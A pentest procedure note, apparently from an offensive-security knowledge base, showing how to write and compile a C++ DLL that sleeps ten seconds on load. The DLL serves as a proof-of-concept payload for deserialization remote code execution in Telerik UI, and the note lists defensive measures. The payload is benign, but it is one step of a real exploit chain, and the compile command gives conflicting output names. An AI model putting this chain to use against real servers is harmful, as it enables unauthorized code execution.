---
tags:
  - payload-creation
  - dll
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Process Injection]]'
updated_at: '2025-12-14T17:23:37.455Z'
sub_techniques: []
id: e53e967f-27e6-41f9-896c-a0e310e68449
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Process Injection]]'
---
# Compile Sleep DLL Payload

## Summary

This procedure compiles a C++ DLL payload that induces a 10-second server sleep upon loading, serving as a proof-of-concept for deserialization-based execution in Telerik UI exploits.

## Description

The DLL uses Windows Sleep API in DllMain to delay on process attach, confirming RCE without persistent harm. It's uploaded via the vulnerable handler and triggered by deserialization, targeting .NET environments on Windows. This step bridges reconnaissance to exploitation by preparing an executable artifact.

## Requirements

1. C++ compiler (e.g., Visual Studio or cl.exe)
2. Windows development environment
3. Basic C++ knowledge for DLL structure

## Defense

Defensive measures and detection strategies:

- Enable DLL loading restrictions via AppLocker or WDAC
- Monitor for unexpected DLLs in app directories like App_Data
- Scan for Sleep API calls in loaded modules
- Implement code signing for all DLLs

## Objectives

1. Create detectable RCE indicator via delay
2. Test deserialization execution without data loss
3. Validate payload compatibility with target architecture (amd64)

## Instructions

### Step 1: Write DLL Source Code

**Context**: Implement DllMain to call Sleep on attach for execution proof.

**Command** (No shell command; use editor):
```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        Sleep(10000);  // 10-second delay
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

> Save as sleep.cpp. This ensures execution is verifiable by timing.

### Step 2: Compile the DLL

**Context**: Build as 64-bit DLL for server compatibility.

**Command** (cl.exe example):
```bash
cl /LD sleep.cpp /Fesleep_2020070207013954_amd64.dll /Fe:sleep.dll
```

> /LD for DLL, /Fe for output name. Success: DLL file generated, ~10KB size.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Process Injection]] Process Injection

### Sub-Techniques

- [[Dynamic-link Library Injection]] Dynamic-link Library Injection

## Commands Used

## Tools Used

## Tags

- [[payload-creation]]
- [[dll]]
- [[rce]]
